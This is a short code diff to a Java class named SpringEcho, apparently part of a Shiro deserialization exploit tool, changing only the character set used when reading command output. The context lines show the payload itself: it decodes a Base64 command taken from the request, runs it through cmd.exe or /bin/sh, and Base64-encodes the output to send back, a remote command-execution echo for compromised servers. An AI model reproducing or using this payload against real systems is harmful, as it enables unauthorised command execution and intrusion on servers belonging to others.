@@ -34,7 +34,7 @@ public class SpringEcho implements EchoPayload {
 //                    String p = org.apache.shiro.codec.Base64.decodeToString(tc);
 //
 //                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
-//                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
+//                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
 //
 //                    String base64Str = "";
 //                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);
@@ -72,7 +72,7 @@ public class SpringEcho implements EchoPayload {
                 "                    String p = org.apache.shiro.codec.Base64.decodeToString(tc);\n" +
                 "\n" +
                 "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", p} : new String[]{\"/bin/sh\", \"-c\", p};\n" +
-                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), \"GBK\").useDelimiter(\"\\\\A\").next().getBytes();\n" +
+                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                 "\n" +
                 "                    String base64Str = \"\";\n" +
                 "                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);\n" +
